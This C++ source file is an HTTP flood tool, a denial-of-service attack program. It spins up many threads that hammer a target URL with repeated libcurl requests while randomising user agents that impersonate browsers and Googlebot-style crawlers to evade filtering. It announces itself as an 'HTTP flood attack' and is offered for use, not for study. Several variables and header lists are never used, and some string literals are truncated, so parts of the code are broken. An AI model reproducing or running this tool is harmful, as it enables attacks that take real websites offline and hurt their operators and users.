#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <sstream>
#include <fstream>
#include <curl/curl.h>

std::string host = "";
std::string port = "80";
std::string page = "";
std::string mode = "";
std::string abcd = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM";
std::vector<std::string> acceptall = {
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charse[...]
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Languag[...]
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en[...]
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
};

std::vector<std::string> referers = {
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?auto=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
};

std::string getuseragent() {
    static std::vector<std::string> choice = {"Macintosh", "Windows", "X11"};
    static std::vector<std::string> choice2 = {"68K", "PPC", "Intel Mac OS X"};
    static std::vector<std::string> choice3 = {"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows"};
    static std::vector<std::string> choice4 = {"Linux i686", "Linux x86_64"};
    static std::vector<std::string> choice5 = {"chrome", "spider", "ie"};
    static std::vector<std::string> choice6 = {".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"};
    static std::vector<std::string> spider = {
        "AdsBot-Google ( http://www.google.com/adsbot.html)",
        "Baiduspider ( http://www.baidu.com/search/spider.htm)",
        "FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
        "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
        "Googlebot-Image/1.0",
        "Googlebot-News",
        "Googlebot-Video/1.0",
    };

    static std::random_device rd;
    static std::mt19937 gen(rd());

    std::uniform_int_distribution<> dist_choice(0, choice.size() - 1);
    std::string platform = choice[dist_choice(gen)];

    std::string os;
    if (platform == "Macintosh") {
        std::uniform_int_distribution<> dist_choice2(0, choice2.size() - 1);
        os = choice2[dist_choice2(gen)];
    } else if (platform == "Windows") {
        std::uniform_int_distribution<> dist_choice3(0, choice3.size() - 1);
        os = choice3[dist_choice3(gen)];
    } else if (platform == "X11") {
        std::uniform_int_distribution<> dist_choice4(0, choice4.size() - 1);
        os = choice4[dist_choice4(gen)];
    }

    std::uniform_int_distribution<> dist_choice5(0, choice5.size() - 1);
    std::string browser = choice5[dist_choice5(gen)];

    if (browser == "chrome") {
        std::uniform_int_distribution<> dist_webkit(500, 599);
        std::uniform_int_distribution<> dist_uwu(0, 99);
        std::uniform_int_distribution<> dist_uwu2(0, 9999);
        std::uniform_int_distribution<> dist_uwu3(0, 999);

        std::string webkit = std::to_string(dist_webkit(gen));
        std::string uwu = std::to_string(dist_uwu(gen)) + ".0" + std::to_string(dist_uwu2(gen)) + "." + std::to_string(dist_uwu3(gen));
        return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit;
    } else if (browser == "ie") {
        std::uniform_int_distribution<> dist_uwu(0, 99);
        std::uniform_int_distribution<> dist_engine(0, 99);
        std::uniform_int_distribution<> dist_option(0, 1);
        std::uniform_int_distribution<> dist_choice6(0, choice6.size() - 1);

        std::string uwu = std::to_string(dist_uwu(gen)) + ".0";
        std::string engine = std::to_string(dist_engine(gen)) + ".0";
        std::string token = (dist_option(gen) == 1) ? choice6[dist_choice6(gen)] + "; " : "";

        return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")";
    }

    std::uniform_int_distribution<> dist_spider(0, spider.size() - 1);
    return spider[dist_spider(gen)];
}

void flood() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        std::string url = "http://" + host + ":" + port + page;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_USERAGENT, getuseragent().c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, nullptr);

        for (int i = 0; i < 100; ++i) {
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            }
        }

        curl_easy_cleanup(curl);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] << " <url> <threads> <get/post> <seconds> <header.txt/nil>" << std::endl;
        return 1;
    }

    std::string url = argv[1];
    int threads = std::stoi(argv[2]);
    mode = argv[3];
    int limit = std::stoi(argv[4]);
    std::string header_file = argv[5];

    CURLU *urlp = curl_url();
    CURLUcode uc = curl_url_set(urlp, CURLUPART_URL, url.c_str(), 0);
    if(uc) {
        std::cerr << "Error: " << curl_easy_strerror(uc) << std::endl;
        return 1;
    }

    char *hostp;
    uc = curl_url_get(urlp, CURLUPART_HOST, &hostp, 0);
    if(uc) {
        std::cerr << "Error: " << curl_easy_strerror(uc) << std::endl;
        return 1;
    }
    host = hostp;
    curl_free(hostp);

    char *portp;
    uc = curl_url_get(urlp, CURLUPART_PORT, &portp, 0);
    if(uc) {
        port = "80";
    } else {
        port = portp;
        curl_free(portp);
    }

    char *pathp;
    uc = curl_url_get(urlp, CURLUPART_PATH, &pathp, 0);
    if(uc) {
        page = "/";
    } else {
        page = pathp;
        curl_free(pathp);
    }

    curl_url_cleanup(urlp);

    std::cout << "Starting HTTP flood attack..." << std::endl;

    std::vector<std::thread> thread_pool;
    for (int i = 0; i < threads; ++i) {
        thread_pool.emplace_back(flood);
    }

    for (auto &t : thread_pool) {
        if (t.joinable()) {
            t.join();
        }
    }

    std::cout << "HTTP flood attack completed." << std::endl;

    return 0;
}
